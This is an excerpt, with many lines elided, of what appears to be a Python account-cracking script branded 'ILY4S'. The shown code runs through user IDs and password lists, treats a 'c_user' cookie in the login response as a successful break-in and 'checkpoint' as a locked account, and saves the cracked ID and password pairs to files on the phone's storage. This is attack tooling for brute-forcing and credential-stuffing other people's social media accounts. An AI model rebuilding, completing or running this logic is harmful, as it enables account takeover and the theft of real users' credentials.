...
def menu():
			...
			if rifat in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/ILY4S.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mILY4S\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[ILY4S-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/ILY4S-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[ILY4S-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ILY4S-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[ILY4S-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ILY4S-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[ILY4S-OK] '+cid+' | '+ps+'\033[1;32m')
